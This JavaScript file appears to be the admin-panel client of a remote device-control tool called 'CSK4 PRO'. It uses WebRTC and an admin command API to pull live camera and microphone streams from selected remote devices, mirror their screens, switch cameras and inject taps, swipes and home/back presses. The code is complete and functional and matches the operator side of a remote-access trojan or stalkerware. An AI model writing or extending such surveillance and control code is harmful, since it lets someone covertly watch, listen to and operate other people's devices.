// ============================================
// CSK4 PRO - WebRTC Client
// Camera Stream + Audio Stream + Screen Mirror
// ============================================

let peerConnection = null;
let currentStreamDevice = null;
let webrtcSocket = null;
let pendingIceCandidates = [];
let isScreenMirror = false;

// ============ SOCKET INIT ============
function initWebRTCSocket() {
  if (webrtcSocket) return;
  // Reuse admin panel socket if available (avoid double connection)
  webrtcSocket = (typeof window !== 'undefined' && window.socket) ? window.socket : io();

  // Camera/audio stream answer
  webrtcSocket.on('webrtc-answer', async (data) => {
    try {
      if (peerConnection && data.signal) {
        await peerConnection.setRemoteDescription(
          new RTCSessionDescription({ type: 'answer', sdp: data.signal.sdp })
        );
        const status = document.getElementById(isScreenMirror ? 'screenStatus' : 'liveStatus');
        if (status) status.textContent = '🔴 LIVE';
        
        // Process pending ICE candidates
        for (const c of pendingIceCandidates) {
          try { await peerConnection.addIceCandidate(c); } catch (e) {}
        }
        pendingIceCandidates = [];
      }
    } catch (e) { console.error('Answer error:', e); }
  });

  // Screen mirror answer
  webrtcSocket.on('screen-mirror-answer', async (data) => {
    try {
      if (peerConnection && data.signal) {
        await peerConnection.setRemoteDescription(
          new RTCSessionDescription({ type: 'answer', sdp: data.signal.sdp })
        );
        const status = document.getElementById('screenStatus');
        if (status) status.textContent = '🔴 MIRRORING';
        
        for (const c of pendingIceCandidates) {
          try { await peerConnection.addIceCandidate(c); } catch (e) {}
        }
        pendingIceCandidates = [];
      }
    } catch (e) { console.error('Screen answer error:', e); }
  });

  // ICE for camera
  webrtcSocket.on('webrtc-ice', async (data) => {
    try {
      if (!data.signal) return;
      const candidate = new RTCIceCandidate({
        sdpMid: data.signal.sdpMid,
        sdpMLineIndex: data.signal.sdpMLineIndex,
        candidate: data.signal.candidate
      });
      if (peerConnection && peerConnection.remoteDescription) {
        await peerConnection.addIceCandidate(candidate);
      } else {
        pendingIceCandidates.push(candidate);
      }
    } catch (e) { console.error('ICE error:', e); }
  });

  // ICE for screen
  webrtcSocket.on('screen-mirror-ice', async (data) => {
    try {
      if (!data.signal) return;
      const candidate = new RTCIceCandidate({
        sdpMid: data.signal.sdpMid,
        sdpMLineIndex: data.signal.sdpMLineIndex,
        candidate: data.signal.candidate
      });
      if (peerConnection && peerConnection.remoteDescription) {
        await peerConnection.addIceCandidate(candidate);
      } else {
        pendingIceCandidates.push(candidate);
      }
    } catch (e) { console.error('Screen ICE error:', e); }
  });
}

// ============ CAMERA / AUDIO LIVE STREAM ============
function startLiveStream(deviceId, type = 'camera') {
  if (!deviceId) { alert('Device select karein'); return; }
  stopLiveStream(true);
  stopScreenMirror(true);
  currentStreamDevice = deviceId;
  isScreenMirror = false;
  pendingIceCandidates = [];

  if (!webrtcSocket) initWebRTCSocket();

  peerConnection = new RTCPeerConnection({
    iceServers: [
      { urls: 'stun:stun.l.google.com:19302' },
      { urls: 'stun:stun1.l.google.com:19302' },
      { urls: 'stun:stun2.l.google.com:19302' }
    ]
  });

  // Receive tracks
  peerConnection.ontrack = (event) => {
    const video = document.getElementById('liveVideo');
    const audio = document.getElementById('liveAudio');
    if (event.track.kind === 'video' && video) {
      video.srcObject = event.streams[0];
      video.play().catch(() => {});
    }
    if (event.track.kind === 'audio' && audio) {
      audio.srcObject = event.streams[0];
      audio.play().catch(() => {});
    }
  };

  peerConnection.onicecandidate = (event) => {
    if (event.candidate && webrtcSocket) {
      webrtcSocket.emit('webrtc-ice', {
        target: deviceId,
        signal: {
          sdpMid: event.candidate.sdpMid,
          sdpMLineIndex: event.candidate.sdpMLineIndex,
          candidate: event.candidate.candidate
        }
      });
    }
  };

  peerConnection.oniceconnectionstatechange = () => {
    const status = document.getElementById('liveStatus');
    if (status) status.textContent = 'ICE: ' + peerConnection.iceConnectionState;
  };

  peerConnection.onconnectionstatechange = () => {
    const status = document.getElementById('liveStatus');
    if (status && peerConnection.connectionState === 'connected') {
      status.textContent = '🔴 LIVE';
    }
  };

  peerConnection.createOffer({
    offerToReceiveVideo: type !== 'audio',
    offerToReceiveAudio: true
  })
  .then(offer => peerConnection.setLocalDescription(offer))
  .then(() => {
    webrtcSocket.emit('webrtc-offer', {
      target: deviceId,
      signal: peerConnection.localDescription
    });

    // Trigger device to start stream
    fetch('/api/admin/command', {
      method: 'POST',
      headers: (typeof authHeaders === 'function' ? authHeaders() : { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + (localStorage.getItem('csk4_token')||'') }),
      body: JSON.stringify({
        deviceId,
        command: type === 'audio' ? 'start_audio_stream' : 'start_webrtc'
      })
    });

    const status = document.getElementById('liveStatus');
    if (status) status.textContent = 'Connecting...';
  })
  .catch(e => console.error('Offer error:', e));
}

function stopLiveStream(silent = false) {
  if (!isScreenMirror && peerConnection) {
    try { peerConnection.close(); } catch (e) {}
    peerConnection = null;
  }
  const v = document.getElementById('liveVideo');
  const a = document.getElementById('liveAudio');
  if (v) v.srcObject = null;
  if (a) a.srcObject = null;

  if (currentStreamDevice && !silent && !isScreenMirror) {
    fetch('/api/admin/command', {
      method: 'POST',
      headers: (typeof authHeaders === 'function' ? authHeaders() : { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + (localStorage.getItem('csk4_token')||'') }),
      body: JSON.stringify({ deviceId: currentStreamDevice, command: 'stop_webrtc' })
    });
  }
  if (!silent && !isScreenMirror) {
    currentStreamDevice = null;
    const status = document.getElementById('liveStatus');
    if (status) status.textContent = 'Not streaming';
  }
}

function switchCamera() {
  if (!currentStreamDevice) { alert('Pehle stream start karein'); return; }
  fetch('/api/admin/command', {
    method: 'POST',
    headers: (typeof authHeaders === 'function' ? authHeaders() : { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + (localStorage.getItem('csk4_token')||'') }),
    body: JSON.stringify({ deviceId: currentStreamDevice, command: 'switch_camera' })
  }).then(() => toast('🔄 Camera switched'));
}

// ============ SCREEN MIRROR (MediaProjection) ============
function startScreenMirror(deviceId) {
  if (!deviceId) { alert('Device select karein'); return; }
  stopLiveStream(true);
  stopScreenMirror(true);
  currentStreamDevice = deviceId;
  isScreenMirror = true;
  pendingIceCandidates = [];

  if (!webrtcSocket) initWebRTCSocket();

  peerConnection = new RTCPeerConnection({
    iceServers: [
      { urls: 'stun:stun.l.google.com:19302' },
      { urls: 'stun:stun1.l.google.com:19302' }
    ]
  });

  peerConnection.ontrack = (event) => {
    const video = document.getElementById('screenVideo');
    if (event.track.kind === 'video' && video) {
      video.srcObject = event.streams[0];
      video.play().catch(() => {});
    }
  };

  peerConnection.onicecandidate = (event) => {
    if (event.candidate && webrtcSocket) {
      webrtcSocket.emit('screen-mirror-ice', {
        target: deviceId,
        signal: {
          sdpMid: event.candidate.sdpMid,
          sdpMLineIndex: event.candidate.sdpMLineIndex,
          candidate: event.candidate.candidate
        }
      });
    }
  };

  peerConnection.onconnectionstatechange = () => {
    const status = document.getElementById('screenStatus');
    if (status && peerConnection.connectionState === 'connected') {
      status.textContent = '🖥️ MIRRORING';
    }
  };

  peerConnection.createOffer({ offerToReceiveVideo: true, offerToReceiveAudio: false })
  .then(offer => peerConnection.setLocalDescription(offer))
  .then(() => {
    webrtcSocket.emit('screen-mirror-offer', {
      target: deviceId,
      signal: peerConnection.localDescription
    });

    // Trigger device to start screen mirror
    fetch('/api/admin/command', {
      method: 'POST',
      headers: (typeof authHeaders === 'function' ? authHeaders() : { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + (localStorage.getItem('csk4_token')||'') }),
      body: JSON.stringify({ deviceId, command: 'start_screen_mirror' })
    });

    const status = document.getElementById('screenStatus');
    if (status) status.textContent = 'Waiting for user permission...';
  })
  .catch(e => console.error('Screen offer error:', e));
}

function stopScreenMirror(silent = false) {
  if (isScreenMirror && peerConnection) {
    try { peerConnection.close(); } catch (e) {}
    peerConnection = null;
  }
  const v = document.getElementById('screenVideo');
  if (v) v.srcObject = null;

  if (currentStreamDevice && !silent && isScreenMirror) {
    fetch('/api/admin/command', {
      method: 'POST',
      headers: (typeof authHeaders === 'function' ? authHeaders() : { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + (localStorage.getItem('csk4_token')||'') }),
      body: JSON.stringify({ deviceId: currentStreamDevice, command: 'stop_screen_mirror' })
    });
  }
  if (!silent && isScreenMirror) {
    currentStreamDevice = null;
    isScreenMirror = false;
    const status = document.getElementById('screenStatus');
    if (status) status.textContent = 'Not streaming';
  }
}

// ============ TOUCH CONTROL ============
function sendTouch(action, x = 0.5, y = 0.5) {
  const deviceId = document.getElementById('screenDevice')?.value || currentStreamDevice;
  if (!deviceId) { alert('Device select karein'); return; }
  
  let command = 'touch_tap';
  if (action === 'swipe') command = 'touch_swipe';
  if (action === 'back') command = 'touch_back';
  if (action === 'home') command = 'touch_home';
  if (action === 'recent') command = 'touch_recent';
  
  fetch('/api/admin/command', {
    method: 'POST',
    headers: (typeof authHeaders === 'function' ? authHeaders() : { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + (localStorage.getItem('csk4_token')||'') }),
    body: JSON.stringify({ deviceId, command, params: { x, y } })
  }).then(() => toast('👆 Touch: ' + action));
}

// ============ VIDEO CLICK FOR TAP ============
document.addEventListener('click', (e) => {
  const screenVideo = document.getElementById('screenVideo');
  if (screenVideo && e.target === screenVideo) {
    const rect = screenVideo.getBoundingClientRect();
    const x = (e.clientX - rect.left) / rect.width;
    const y = (e.clientY - rect.top) / rect.height;
    sendTouch('tap', x, y);
  }
});

// ============ CLEANUP ============
window.addEventListener('beforeunload', () => {
  if (peerConnection) {
    try { peerConnection.close(); } catch (e) {}
  }
  if (webrtcSocket) {
    try { webrtcSocket.disconnect(); } catch (e) {}
  }
});
